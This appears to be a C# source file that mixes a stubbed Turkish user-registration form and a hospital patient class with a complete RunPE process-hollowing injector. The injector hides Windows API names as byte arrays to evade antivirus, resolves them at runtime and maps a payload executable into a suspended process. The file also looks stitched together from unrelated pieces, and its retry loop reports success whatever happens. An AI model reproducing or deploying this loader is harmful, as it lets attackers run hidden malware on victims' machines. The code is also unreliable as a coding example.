using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic; // Install-Package Microsoft.VisualBasic
using Microsoft.VisualBasic.CompilerServices; // Install-Package Microsoft.VisualBasic


public partial class RegisterScreen : Form
{
    bool adYazdiMi = false;
    bool soyadYazdiMi = false;
    bool kullaniciAdiYazdiMi = false;
    bool sifreYazdiMi = false;
    LoginScreen loginScreen;
    public RegisterScreen(LoginScreen loginScreen)
    {
        this.loginScreen = loginScreen;
        InitializeComponent();
    }

    private void InitializeComponent()
    {
        throw new NotImplementedException();
    }

    public class Kullanici
    {
        public Kullanici(int kullaniciId, string kullaniciAdi, string sifre, byte yetki)
        {
            this.kullaniciId = kullaniciId;
            this.kullaniciAdi = kullaniciAdi;
            this.sifre = sifre;
            this.yetki = yetki;
        }

        private int kullaniciId;
        private string kullaniciAdi;
        private string sifre;
        private byte yetki;
         private int sexxx;
       
        public int KullaniciID
        {
            get
            {
                return kullaniciId;
            }
            set
            {
                kullaniciId = value;
            }
        }

        public string KullaniciAdi
        {
            get
            {
                return kullaniciAdi;
            }
            set
            {
                kullaniciAdi = value;
            }
        }

        public string Sifre
        {
            get
            {
                return sifre;
            }
            set
            {
                sifre = value;
            }
        }

        public byte Yetki
        {
            get
            {
                return yetki;
            }
            set
            {
                yetki = value;
            }
        }
    }
}

public class LoginScreen
{
}

namespace yarak
{
    public static class klass
    {
        private static string kernel32 = BytesToStr(new byte[] { 107, 101, 114, 110, 101, 108, 51, 50 });
        private static string LoadLibraryA = BytesToStr(new byte[] { 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65 });

        private delegate IntPtr LoadLibraryAParameters(string name);

        private static readonly LoadLibraryAParameters LoadLibrary = CreateApi<LoadLibraryAParameters>(kernel32, LoadLibraryA);

        private static DelegateInstance CreateApi<DelegateInstance>(string name, string method)
        {
            return (DelegateInstance)(object)Marshal.GetDelegateForFunctionPointer((IntPtr)GetProcAddress((long)GetInternalModuleBaseAddr(name), method), typeof(DelegateInstance));
        }

        private static IntPtr GetInternalModuleBaseAddr(string ModuleName)
        {
            if (ModuleName.Contains(".dll") == false)
                ModuleName = ModuleName + ".dll";
            IntPtr ModuleBaseAddress = default;
            foreach (ProcessModule ProcessModule in Process.GetCurrentProcess().Modules)
            {
                if ((ProcessModule.ModuleName.ToLower() ?? "") == (ModuleName ?? ""))
                    return ProcessModule.BaseAddress;
            }

            return LoadLibrary(ModuleName);
        }

        private static byte[] ReadByteArray(IntPtr Address, int Size)
        {
            var ReturnArray = new byte[Size];
            Marshal.Copy(Address, ReturnArray, 0, Size);
            return ReturnArray;
        }

        private static long GetProcAddress(long ModuleAddress, string Export)
        {
            byte[] IExportDir = null;
            if (IntPtr.Size == 4)
                IExportDir = ReadByteArray((IntPtr)(ModuleAddress + Marshal.ReadInt32((IntPtr)(ModuleAddress + Marshal.ReadInt32((IntPtr)(ModuleAddress + 0x3CL)) + 0x78L)) + 24L), 16);
            if (IntPtr.Size == 8)
                IExportDir = ReadByteArray((IntPtr)(ModuleAddress + Marshal.ReadInt32((IntPtr)(ModuleAddress + Marshal.ReadInt32((IntPtr)(ModuleAddress + 0x3CL)) + 0x88L)) + 24L), 16);
            for (int i = 0, loopTo = BitConverter.ToInt32(IExportDir, 0); i <= loopTo; i += 1)
            {
                int tpAddress = Marshal.ReadInt32((IntPtr)(BitConverter.ToInt32(IExportDir, 8) + ModuleAddress + i * 4));
                string ApiString = Encoding.ASCII.GetString(ReadByteArray((IntPtr)(ModuleAddress + tpAddress), 64)).Split(Convert.ToChar(Constants.vbNullChar))[0];
                int Ord = BitConverter.ToInt16(ReadByteArray((IntPtr)(BitConverter.ToInt32(IExportDir, 12) + ModuleAddress + i * 2), 2), 0);
                if ((ApiString ?? "") == (Export ?? ""))
                    return BitConverter.ToInt32(ReadByteArray((IntPtr)(BitConverter.ToInt32(IExportDir, 4) + ModuleAddress + Ord * 4), 4), 0) + ModuleAddress;
            }

            return default;
        }

        private delegate bool CP(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

        private delegate bool GTC(IntPtr thread, int[] context);

        private delegate bool W64GTC(IntPtr thread, int[] context);

        private delegate bool STC(IntPtr thread, int[] context);

        private delegate bool W64STC(IntPtr thread, int[] context);

        private delegate bool RPM(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        private delegate bool WPM(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        private delegate int NTU(IntPtr process, int baseAddress);

        private delegate int VAE(IntPtr handle, int address, int length, int type, int protect);

        private delegate int RT(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private partial struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private partial struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }

        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {

            // Step 3
            // We retrieve the name of the API we are going to have to call, this method was used for bypass some AV some years ago
            string K32 = BytesToStr(new byte[] { 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108 });                // Kernel32.dll
            string NTD = BytesToStr(new byte[] { 110, 116, 100, 108, 108, 46, 100, 108, 108 });                             // Ntdll.dll
            string CP = BytesToStr(new byte[] { 67, 114, 101, 97, 116, 101, 80, 114, 111, 99, 101, 115, 115, 65 });         // CreateProcess
            string GTC = BytesToStr(new byte[] { 71, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116 }); // GetThreadContext
            string STC = BytesToStr(new byte[] { 83, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116 }); // SetThreadContext
            string W64GTC = BytesToStr(new byte[] { 87, 111, 119, 54, 52, 71, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116 }); // Wow64GetThreadContext
            string W64STC = BytesToStr(new byte[] { 87, 111, 119, 54, 52, 83, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116 }); // Wow64SetThreadContext
            string RPM = BytesToStr(new byte[] { 82, 101, 97, 100, 80, 114, 111, 99, 101, 115, 115, 77, 101, 109, 111, 114, 121 });                      // ....
            string WPM = BytesToStr(new byte[] { 87, 114, 105, 116, 101, 80, 114, 111, 99, 101, 115, 115, 77, 101, 109, 111, 114, 121 });
            string NTU = BytesToStr(new byte[] { 78, 116, 85, 110, 109, 97, 112, 86, 105, 101, 119, 79, 102, 83, 101, 99, 116, 105, 111, 110 });
            string VAE = BytesToStr(new byte[] { 86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 69, 120 });
            string RT = BytesToStr(new byte[] { 82, 101, 115, 117, 109, 101, 84, 104, 114, 101, 97, 100 });

            // Step 4
            // Here, the API are resolved at runtime by a custom GetProcAdress 
            var CreateProcess = CreateApi<CP>(K32, CP);
            var GetThreadContext = CreateApi<GTC>(K32, GTC);
            var Wow64GetThreadContext = CreateApi<W64GTC>(K32, W64GTC);
            var SetThreadContext = CreateApi<STC>(K32, STC);
            var Wow64SetThreadContext = CreateApi<W64STC>(K32, W64STC);
            var ReadProcessMemory = CreateApi<RPM>(K32, RPM);
            var WriteProcessMemory = CreateApi<WPM>(K32, WPM);
            var NtUnmapViewOfSection = CreateApi<NTU>(NTD, NTU);
            var VirtualAllocEx = CreateApi<VAE>(K32, VAE);
            var ResumeThread = CreateApi<RT>(K32, RT);
            var ReadWrite = default(int);
            string QuotedPath = string.Format("\"{0}\"", path);
            var SI = new STARTUP_INFORMATION();
            var PI = new PROCESS_INFORMATION();
            SI.Size = (uint)Marshal.SizeOf(typeof(STARTUP_INFORMATION));
            try
            {
                if (!string.IsNullOrEmpty(cmd))
                {
                    QuotedPath = QuotedPath + " " + cmd;
                }

                // Step 5 : we create a suspended process where the payload will be injected
                if (!CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref SI, ref PI))
                    throw new Exception();
                int FileAddress = BitConverter.ToInt32(data, 60); // We get the value of elf_new (used to find NtHeader)
                int ImageBase = BitConverter.ToInt32(data, FileAddress + 52); // We get the image base of our payload
                var Context = new int[179];
                Context[0] = 65538; // Context FULL

                // Step 6 : We check if our process is x86 or x64
                // Then we get the context of the Suspended Process created earlier
                if (IntPtr.Size == 4)
                {
                    if (!GetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }
                else if (!Wow64GetThreadContext(PI.ThreadHandle, Context))
                    throw new Exception();
                int Ebx = Context[41];
                var BaseAddress = default(int);

                // Step 7 : We get the baseAdress of the Suspended Process by reading is memory at the Ebx + 8
                if (!ReadProcessMemory(PI.ProcessHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
                    throw new Exception();

                // Step 8 : If the ImageBase of our payload is the same as the Suspended Process we need to unmap it to map our payload 
                if (ImageBase == BaseAddress)
                {
                    if (!(NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) == 0))
                        throw new Exception();
                }

                int SizeOfImage = BitConverter.ToInt32(data, FileAddress + 80); // Get the Size of our payload
                int SizeOfHeaders = BitConverter.ToInt32(data, FileAddress + 84); // Get the SizeHeader of our payload
                var AllowOverride = default(bool);

                // Step 9 : Create a buffer into the Suspended Process at the ImageBase of our payload
                int NewImageBase = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64);

                // This is the only way to execute under certain conditions. However, it may show
                // an application error probably because things aren't being relocated properly.
                if (!compatible && NewImageBase == 0)
                {
                    AllowOverride = true;
                    NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64);
                }

                if (NewImageBase == 0)
                    throw new Exception();

                // Step 10 : Now, we write the Header bytes of our payload in the region created in the Step 9
                if (!WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
                    throw new Exception();
                int SectionOffset = FileAddress + 248; // Get the address of Sections Header
                short NumberOfSections = BitConverter.ToInt16(data, FileAddress + 6); // Get the number of sections

                // Step 11 : We write all sections in the region created previously
                // After this, our payload is corectly mapped in the suspended process
                for (int I = 0, loopTo = NumberOfSections - 1; I <= loopTo; I++)
                {
                    int VirtualAddress = BitConverter.ToInt32(data, SectionOffset + 12);
                    int SizeOfRawData = BitConverter.ToInt32(data, SectionOffset + 16);
                    int PointerToRawData = BitConverter.ToInt32(data, SectionOffset + 20);
                    if (!(SizeOfRawData == 0))
                    {
                        var SectionData = new byte[SizeOfRawData];
                        Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);
                        if (!WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
                            throw new Exception();
                    }

                    SectionOffset += 40;
                }

                var PointerData = BitConverter.GetBytes(NewImageBase);
                // Step 12 : We overwrite the BaseAddress of the PEB by the new ImageBase of our payload
                if (!WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
                    throw new Exception();
                int AddressOfEntryPoint = BitConverter.ToInt32(data, FileAddress + 40);
                if (AllowOverride)
                    NewImageBase = ImageBase;

                // Step 13 : We update EAX by the entry Point of our payload
                Context[44] = NewImageBase + AddressOfEntryPoint;

                // Step 14 : Update the ContextThread
                if (IntPtr.Size == 4)
                {
                    if (!SetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }
                else if (!Wow64SetThreadContext(PI.ThreadHandle, Context))
                    throw new Exception();

                // Step 15 : Resume our suspended Process
                if (ResumeThread(PI.ThreadHandle) == -1)
                    throw new Exception(); // spoted avast
            }
            catch
            {
                var P = Process.GetProcessById((int)PI.ProcessId);
                if (P is object)
                    P.Kill();
                return false;
            }

            return true;
        }

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            for (int I = 1; I <= 5; I++)
            {
                if (HandleRun(path, cmd, data, compatible)) // Step 2 : We will try to run the RunPe 5 times in case of some error
                {
                }

                return true;
            }

            return false;
        }

        private static string BytesToStr(byte[] input)
        {
            return Encoding.Default.GetString(input);
        }
    }
}


public partial class TBLHastalar
{
    public byte HastaID { get; set; }
    public string HastaAd { get; set; }
    public string HastaSoyad { get; set; }
    public string HastaTC { get; set; }
    public string HastaCinsiyet { get; set; }
    public string HastaDogumYeri { get; set; }
    public string HastaTelefon { get; set; }
    public string Poliklinik { get; set; }
    public string RandevuTarihi { get; set; }
}

